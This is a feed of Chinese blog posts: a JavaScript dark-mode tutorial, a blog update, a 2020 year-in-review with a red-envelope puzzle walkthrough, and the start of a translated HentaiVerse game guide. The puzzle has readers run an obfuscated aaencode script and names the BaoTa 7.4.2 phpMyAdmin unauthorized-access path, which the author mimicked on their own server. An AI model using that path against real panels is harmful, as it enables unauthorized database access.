class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a 